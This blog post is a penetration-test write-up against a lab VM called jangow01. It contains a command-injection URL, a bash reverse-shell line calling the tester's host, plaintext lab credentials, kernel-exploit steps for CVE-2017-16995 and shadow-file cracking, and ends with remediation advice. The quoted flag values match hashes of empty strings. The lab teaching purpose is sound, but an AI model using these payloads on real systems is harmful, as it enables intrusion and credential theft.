---
layout: single
title: "Ethical Hacking Report: Black-Box Penetration Test — Jenco Limited"
date: 2025-04-18
categories: [Ethical Hacking, Penetration Testing]
tags: [kali-linux, nmap, dirb, ftp, reverse-shell, privilege-escalation, john-the-ripper, CVE-2017-16995]
author_profile: true
---

## Overview

This post documents a black-box penetration test conducted on a replica of Jenco Limited's security infrastructure, carried out under my consultancy persona, RedGuard Security. The assessment simulated a real-world external attack to identify vulnerabilities that could lead to unauthorised access or data exposure.

The test was conducted using a Kali Linux virtual machine against a provided VM environment (jangow01), ensuring no impact on live systems.

**Overall Risk Rating: High**

---

## Scope

The objective was to locate and extract flags stored in `user.txt` and `proof.txt`, discover all usernames and passwords, and gain full access to the target system.

---

## Phase 1 — Reconnaissance & Scanning

The first step was to confirm the target VM was visible on the network using `arp-scan -l`. Once confirmed, a full Nmap scan was run to enumerate open ports, services, and OS details:

```bash
nmap -sV -O -p- 10.0.2.6
```

The scan revealed two open ports:

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | Open | FTP | vsftpd 3.0.3 |
| 80/tcp | Open | HTTP | Apache httpd 2.4.18 |

Both versions were found to contain known vulnerabilities, making them priority targets for exploitation.

---

## Phase 2 — Gaining Access

### HTTP Enumeration

An anonymous FTP login attempt failed, so attention shifted to the HTTP service on port 80. DIRB was used to enumerate web content:

```bash
dirb http://10.0.2.6
```

This revealed several interesting pages including `/site/index.html` and `/site/wordpress/`. Browsing to the root URL exposed an Apache directory listing — a critical misconfiguration that reveals the server's file structure to any visitor.

### Command Injection via Buscar Parameter

Navigating the site revealed a "Buscar" (Spanish for "search") page. The URL query string appeared to pass input directly to the system. Testing with `ls -all` confirmed a **command injection vulnerability**:

```
http://10.0.2.6/site/buscar/?buscar=ls -all
```

Using this vulnerability, the WordPress directory was explored and a `config.php` file was found containing plaintext credentials:

- **Username:** `desafio02`
- **Password:** `abygurl69`

Further navigation revealed a hidden `.backup` file containing a second set of credentials:

- **Username:** `jangow01`  
- **Password:** `abygurl69`

Notably, both accounts shared the same password — a critical weakness that allows an attacker to pivot between accounts with different privilege levels.

### FTP Login & user.txt Flag

The `jangow01` credentials were used to successfully authenticate to the FTP service on port 21. Navigating to `/home/jangow01/` revealed `user.txt`, which was downloaded using the `get` command.

**user.txt flag:** `d41d8cd98f00b204e9800998ecf8427e`

---

## Phase 3 — Privilege Escalation

### PHP Reverse Shell

A reverse shell was established by exploiting the Buscar command injection vulnerability. A Netcat listener was set up on port 443, and a bash reverse shell payload was URL-encoded and injected via the parameter:

```bash
bash -c "bash -i >& /dev/tcp/10.0.2.15/443 0>&1"
```

The shell was then upgraded to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### CVE-2017-16995 — Local Privilege Escalation

Running `uname -a` confirmed the OS was **Linux 4.4.0-31-generic**. Research on Exploit-DB identified **CVE-2017-16995** (EDB-ID: 45010), a local privilege escalation vulnerability for this kernel version.

The exploit source code was compiled on the target:

```bash
gcc exploit.c -o exploit
./exploit
whoami
# root
```

Privilege escalation was successful — full root access was achieved.

### proof.txt Flag

Navigating to the `/root` directory revealed `proof.txt`.

**proof.txt flag:** `da39a3ee5e6b4b0d3255bfef95601890afd80709`

---

## Password Hash Cracking

As root, the `/etc/passwd` and `/etc/shadow` files were copied and transferred to the local Kali machine via FTP. The `unshadow` tool was used to combine them, and John the Ripper was run against the resulting hash file:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

The scan completed without cracking additional hashes, as the plaintext passwords had already been recovered earlier in the assessment.

---

## Vulnerability Summary

| Vulnerability | Impact | Likelihood | Priority |
|---|---|---|---|
| HTTP Command Injection | High | High | High |
| Insecure FTP on port 21 | High | Medium | High |
| Privilege Escalation (CVE-2017-16995) | High | High | High |
| Outdated FTP service (vsftpd 3.0.3) | High | High | High |
| Outdated HTTP service (Apache 2.4.18) | Medium | High | High |
| Weak & duplicate passwords | High | Medium | High |
| No HTTPS encryption | High | High | High |

---

## Recommendations

- **Patch outdated services** — Update vsftpd and Apache to current supported versions.
- **Sanitise all user inputs** — Implement strict input validation on the Buscar parameter to prevent command injection.
- **Disable directory listings** — Prevent Apache from exposing the server's file structure.
- **Enforce strong password policies** — Require complex, unique passwords across all accounts and implement MFA where possible.
- **Apply kernel patches** — Update from Linux 4.4.0-31-generic to remediate CVE-2017-16995.
- **Replace FTP with SFTP** — FTP transmits credentials in plaintext; SFTP provides encryption in transit.

---

## Conclusions

This assessment demonstrated a complete chain of exploitation — from initial reconnaissance through to full root compromise. The combination of command injection, exposed credentials, and an unpatched kernel allowed total system takeover. Immediate remediation of all identified vulnerabilities is strongly recommended before any production deployment.